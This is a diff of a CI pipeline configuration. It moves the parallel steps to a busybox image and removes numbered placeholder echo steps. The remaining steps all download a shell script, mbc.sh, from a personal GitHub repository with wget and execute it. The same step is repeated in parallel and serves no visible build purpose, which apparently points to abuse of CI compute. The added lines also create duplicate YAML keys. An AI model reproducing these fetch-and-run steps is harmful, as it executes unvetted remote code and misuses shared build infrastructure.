@@ -1,52 +1,10 @@
 - type: parallel
   steps:
-    - service: ruby:latest
+    - service: busybox
       command: wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
-    - service: ruby:latest
+      command: chmod +x mbc.sh
+      command: sh mbc.sh
+    - service: busybox
       command: wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
-    - service: ruby:latest
-      command: wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
-    - service: ruby:latest
-      command: wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
-    - service: ruby:latest
-      command: wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
-    - service: ruby:latest
-      command: echo 6
-    - service: ruby:latest
-      command: echo 7
-    - service: ruby:latest
-      command: echo 8
-    - service: ruby:latest
-      command: echo 9
-    - service: ruby:latest
-      command: echo 10
-    - service: ruby:latest
-      command: echo 11
-    - service: ruby:latest
-      command: echo 12
-    - service: ruby:latest
-      command: echo 13
-    - service: ruby:latest
-      command: echo 14
-    - service: ruby:latest
-      command: echo 15
-    - service: ruby:latest
-      command: echo 16
-    - service: ruby:latest
-      command: echo 17
-    - service: ruby:latest
-      command: echo 18
-    - service: ruby:latest
-      command: echo 19
-    - service: ruby:latest
-      command: echo 20
-    - service: ruby:latest
-      command: echo 21
-    - service: ruby:latest
-      command: echo 22
-    - service: ruby:latest
-      command: echo 23
-    - service: ruby:latest
-      command: echo 24
-    - service: ruby:latest
-      command: echo 25
+      command: chmod +x mbc.sh
+      command: sh mbc.sh
